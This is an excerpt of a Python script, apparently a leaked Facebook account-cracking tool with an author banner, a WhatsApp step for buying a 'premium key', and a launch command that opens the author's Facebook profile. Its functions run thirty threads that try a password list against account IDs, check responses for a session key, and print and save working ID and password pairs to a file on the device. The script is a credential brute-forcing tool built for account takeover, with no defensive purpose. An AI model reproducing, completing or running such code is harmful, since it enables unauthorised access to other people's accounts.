#SOURCE LEAKED BY :Jawad

#REASON : BECAUSE LOL BADSHAH

#WAS INTERFERE BETWEEN

#AWAIS & Jawad FIGHT ðŸ˜Ž 

from os import path

import os,base64,zlib,pip,urllib

os.system('xdg-open https://www.facebook.com/profile.php?id=100014819521906/')
...
_                         _   _  ___
    ...
    | | __ ___      ____ _  __| | | |/ / |__   __ _ _ __

 _  | |/ _` \ \ /\ / / _` |/ _` | | ' /| '_ \ / _` | '_ \

| |_| | (_| |\ V  V / (_| | (_| | | . \| | | | (_| | | | |

 \___/ \__,_| \_/\_/ \__,_|\__,_| |_|\_\_| |_|\__,_|_| |_|

----------------------------------------------

 Author    : Jawad Khan

 Github    : Jawadomaeri009
...
def menu():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        url_wa = "https://api.whatsapp.com/send?phone=+93729527432&text="

                        name = input(" Enter your Name : ")

                        linex()

                        tks = ("Hi Jawad Sir, I Need To Buy Your Paid Jawad Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)

                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)

                        print(' Run :  python Jawad.py')
...
def bd():
                ...
                with tred(max_workers=30) as Jawad:     
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write('\r\r\033[1;37m [Jawad-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                ...
                try:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        print('\r\r\033[1;32m [Jawad-OK] '+ids+' | '+pas+'\033[1;97m')
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        if 'y' in pcp:
                                                ...
                                                print('\r\r\x1b[38;5;208m [Jawad-CP] '+ids+' | '+pas+'\033[1;97m')
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        try:
                                                ...
                                                okk=open('/sdcard/Jawad-OK.txt','r').read()
